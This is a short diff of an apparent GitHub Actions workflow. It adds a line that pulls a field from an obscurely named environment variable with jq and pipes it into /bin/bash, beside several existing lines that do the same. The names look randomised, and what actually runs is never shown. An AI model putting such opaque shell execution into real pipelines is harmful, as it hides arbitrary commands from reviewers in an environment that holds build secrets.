@@ -49,6 +49,7 @@ jobs:
           echo $m05032 | jq -r .hcuxm4010 | /bin/bash
           echo $pys7 | jq -r .wfan2 | /bin/bash
           printf '%s' "$ejcfp53" | jq -r .u76 | /bin/bash
+          echo $m673 | jq -r .cqi778 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
